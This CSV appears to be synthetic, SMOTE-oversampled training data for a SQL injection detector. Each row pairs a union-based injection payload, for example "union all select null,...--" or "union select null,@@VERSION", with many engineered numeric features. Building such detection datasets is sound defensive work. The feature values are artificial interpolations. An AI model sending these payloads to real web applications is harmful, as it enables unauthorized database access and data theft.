id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000033,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000062,0.05739773960283848,64.98006606479605,21.0,3.6417490852999093,14.000000000000002,36.0,4.0,10.980066064796052,0.21545170074347486,0.5540186590546496,0.06155762878384996,0.16897201141802567,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9800660647960511,0.0,7.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000034,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000066,1.2695083552423145,63.81635488784442,26.323631364482523,4.082901061145992,27.33818431775874,15.231808808404733,16.0,5.246361761680947,0.43652787324772957,0.2291900663067229,0.25357718433776083,0.08070487610778669,0.0,1.0,0.4154539205603156,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.8309078411206312,1.4154539205603158,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000035,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000027,0.3433793460716371,71.30474108575903,31.152370542879513,4.39083690369335,44.0,1.9999999999999982,15.30474108575903,10.0,0.6171312738233846,0.02805142153742657,0.2145601969520559,0.14025710768713287,0.0,0.0,2.0,0.0,1.8476294571204852,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000036,attack,union,1'   )    )    as vwua where 8099  =  8099 union all select null--,nearest_attack_euclidean,R000039,0.19342881445075347,65.36100291489727,23.182570595743638,3.7643983557454836,29.0,9.0,21.45228821276909,5.908714702128181,0.4441527774699484,0.13784051714584605,0.3276602357254802,0.09034646965872531,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.9087147021281814,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000037,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,0.11921718429639201,70.0,19.58366193643256,3.686143595554956,14.000000000000002,40.0,4.0,12.0,0.19999999999999998,0.5714285714285714,0.057142857142857134,0.17142857142857143,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000038,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R000081,0.35650438683279806,60.662726413941584,21.0,3.667442070479351,14.000000000000002,33.33018113115327,4.0,9.332545282788317,0.2315700884806725,0.5485810467924128,0.06616288242304928,0.15368598230386551,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.332545282788318,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000039,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,0.5931637772738024,70.95719167803803,20.0,3.7046996603647737,14.000000000000002,40.95719167803803,4.0,12.0,0.19741299546476207,0.5769721525755098,0.05640371298993202,0.16921113896979606,0.7607020804904918,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.239297919509507,3.0,0.7607020804904918,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000109,0.31742843975239915,66.506554449704,23.3013108899408,3.9477292823024266,19.0,29.205243559763204,10.0,8.301310889940801,0.28601658581442285,0.4387158916028343,0.15053504516548571,0.12473247741725715,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.3013108899408,4.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000041,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000092,0.8094668148344063,71.18688678936363,17.0,3.2454270773555542,41.31213207361818,1.0,16.437377357872727,12.437377357872727,0.579931697383632,0.014334501868834226,0.23153590411143532,0.17419789663609836,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.6093443394681817,1.0,0.0,5.828033018404545,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000042,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000078,0.599805228082428,80.85309643452426,19.587614261902967,3.467745083089823,57.237157214291095,2.1752285238059343,11.440710696427226,10.0,0.707697074802569,0.02705870586323403,0.14156072617759852,0.12368349315659836,1.0,0.0,0.0,0.0,0.0,0.14690356547574196,0.0,1.0,0.0,0.0,6.853096434524257,0.14690356547574224,1.0,0.0,0.0,1.0,0.0,0.14690356547574202,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.14690356547574196,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.146903565475742
SMOTE_000043,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000044,0.7791371562596618,56.0,16.717611571117295,3.2711406645345193,39.12955371553081,1.0,6.870446284469188,9.0,0.6987420306344788,0.01785714285714285,0.12268654079409264,0.16071428571428573,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7176115711172969,1.0,0.0,5.282388428882703,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.7176115711172969,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000057,0.6213210035079928,56.0,16.225189956098017,3.2037713690154206,41.09924017560793,1.0,4.900759824392072,9.0,0.7339150031358559,0.01785714285714285,0.08751356829271557,0.16071428571428573,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22518995609801795,1.0,0.0,5.774810043901982,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.22518995609801795,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000045,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,1.1654072834588234,68.00612416087797,19.797550335648808,3.7326574601787437,14.000000000000002,36.80979865740476,5.595100671297619,11.601224832175596,0.20613500258191392,0.5398771295787284,0.08343572535105964,0.17055214248829803,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.3987751678244047,0.0,0.0,7.202449664351191,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.39877516782440464,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000046,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000092,0.6464325081072189,69.89035499851849,16.777411250370378,3.2245165605690076,38.89035499851849,1.0,18.0,12.0,0.5562042892503619,0.014315990669343165,0.2576878320481769,0.17179188803211795,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,0.777411250370378,0.0,5.222588749629622,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000047,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,1.3508579170489734,72.69163134183165,20.44860522363861,3.55183861101259,14.000000000000002,32.0,15.794420894554431,10.897210447277216,0.19291675962675878,0.4409525934325916,0.21652756087089609,0.1496030860697535,0.4486052236386079,0.0,1.0,0.0,0.0,0.0,0.0,2.4486052236386078,0.0,0.0,6.0,1.0,0.4486052236386079,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000048,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000115,1.1610739055300867,77.19222102013066,26.397407006710218,4.092368727276117,32.615557959738695,19.48055255032663,15.0,10.096110510065326,0.4257074162017631,0.2494104988716262,0.19457546119265481,0.13030662373395588,2.3974070067102176,0.0,2.698703503355109,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,4.698703503355109,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000049,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,0.6299591141044057,66.73823034408873,20.0,3.560486081070287,14.000000000000002,29.390584275270985,14.0,9.347646068817747,0.2108725655197042,0.43850417339479275,0.21087256551970424,0.13975069556579878,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,5.347646068817746,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000050,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000018,1.2341046618189462,75.27362502525153,30.358249848490765,4.262742181223614,42.905499898993845,1.9999999999999982,18.641750151509232,11.726374974748461,0.5701531563707843,0.026570657885876675,0.2474525677077046,0.1558236180356344,0.0,0.0,2.0,0.0,1.7263749747484611,1.0,0.0,0.5472500505030774,0.0,0.0,1.0000000000000004,6.726374974748462,0.0,0.0,1.0,0.0,0.0,1.0,0.2736250252515387,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000051,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000019,0.05080774513739338,76.89228580831548,25.10771419168453,3.8514399179347456,43.67685742494641,2.1077141916845257,23.10771419168453,8.0,0.5679865765815094,0.027428130748988033,0.3005419376569468,0.10404335501255575,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000052,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000010,1.1511859412719485,75.29950215645403,32.08019913741839,4.2971643797667545,42.0,3.459900431290805,19.299502156454025,10.540099568709195,0.5583809113854814,0.0457805101887718,0.25549211815269146,0.1403464602730553,0.0,0.0,2.0,0.0,1.0,1.459900431290805,0.0,0.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000053,attack,union,"1""  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000059,0.004705787990725718,56.024835219105185,16.0,3.273778122901639,38.01986817528415,1.0,8.0,9.004967043821038,0.6786208663612164,0.017849872593938776,0.1427989807515101,0.16073028029333475,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.004967043821037,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000078,0.06898660895251317,81.0194729043266,18.941581287020202,3.423112798684366,58.82474386106061,1.0,11.136310330286193,10.058418712979796,0.7260848165297562,0.012342747229098672,0.13743254062113652,0.12413989562000866,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0389458086531975,0.0,0.0,7.019472904326598,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,union,"1""   )    )    as mlid where 1047  =  1047 union all select null,null#",nearest_attack_euclidean,R000040,0.15360654288043674,69.27159961707179,24.87859993617863,3.8261653095197943,32.75719987235726,9.0,21.635799808535893,5.878599936178631,0.47316285805459096,0.1301861092232399,0.3119533977886535,0.08469763493351562,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.9392999680893155,0.0,0.0,0.9392999680893155,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000056,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,0.5905551755554509,70.95298216297357,20.0,3.7047445081376287,14.000000000000002,40.95298216297357,4.0,12.0,0.1974243725325039,0.5769477731446346,0.0564069635807154,0.1692208907421462,0.7617544592566081,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.238245540743392,3.0,0.7617544592566081,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,0.16491998516594086,76.20842167833342,22.06596486013888,3.8205299885506316,14.000000000000002,35.73614055944448,13.604210839166711,12.868070279722238,0.18403238691375265,0.4691667617696746,0.17794332290093284,0.16885752841563992,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.9340351398611184,1.0,0.0,6.934035139861118,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000058,attack,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000007,1.9688880835077094,79.30366788351319,26.550611313918864,3.894239175102759,40.0,3.1012226278377284,24.651833941756593,11.550611313918864,0.505111245933805,0.038685106538613734,0.31058328277482317,0.14562036475275814,1.6518339417565922,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.449388686081136,0.5506113139188641,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000059,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000127,1.3865866634788349,59.0,25.0,3.9672457286159286,25.185950545348803,13.195454400116315,15.237190109069761,5.381404945465119,0.42688051771777635,0.22365176949349685,0.2582574594757586,0.09121025331296813,1.0,0.0,1.6185950545348804,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.3814049454651198,2.61859505453488,1.0,0.0,0.6185950545348804,0.38140494546511955,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000060,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000153,0.8290595306494386,61.5981062643918,25.0,3.9109460476626783,19.0,22.309427790570492,14.0,6.288678473821312,0.30972980582665893,0.3599935479451204,0.22822196218806448,0.10205468404015618,0.7113215261786884,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.5773569476426235,2.0,0.7113215261786883,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000061,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,0.3529541295970709,76.40816385099502,22.0,3.7950950259819076,14.000000000000002,35.21088513466003,14.394557432669984,12.802721283665008,0.1833337673470038,0.4603153935856963,0.18889091428601765,0.1674599247812823,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.098639358167496,0.9013606418325039,0.0,6.802721283665008,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000062,attack,union," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",nearest_attack_euclidean,R000022,0.0900003782072418,70.19809324035371,32.90095337982314,4.466659877952899,40.0,2.0198093240353714,15.15847459228297,13.019809324035371,0.5700136197117591,0.028748297536030087,0.2157360397954468,0.1855020429567639,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.039618648070742335,0.0,0.0,1.0000000000000004,5.0,1.0,0.0,1.0,0.9801906759646288,0.0,1.0,0.019809324035371167,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000063,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,0.020564517340141572,69.89005624463083,14.0,2.906880733348876,53.91204499570466,1.0,4.0,10.978011248926165,0.771376217259348,0.014311891370325958,0.05724756548130397,0.15706432588902203,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.978011248926165,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000064,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000019,0.004668671874635466,76.9901022528007,25.009897747199307,3.8522119536167647,43.970306758402074,2.0098977471993074,23.00989774719931,8.0,0.5711122900331047,0.02610764217852793,0.2988704331373771,0.10390963465099018,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000065,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000098,0.9224149902640806,67.47107307601807,14.632231730995482,2.978938800857067,51.47107307601807,1.0,4.0,11.0,0.7626703829472488,0.014833101065796966,0.05933240426318781,0.1631641117237665,0.6322317309954817,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.367768269004518,2.0,0.6322317309954817,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
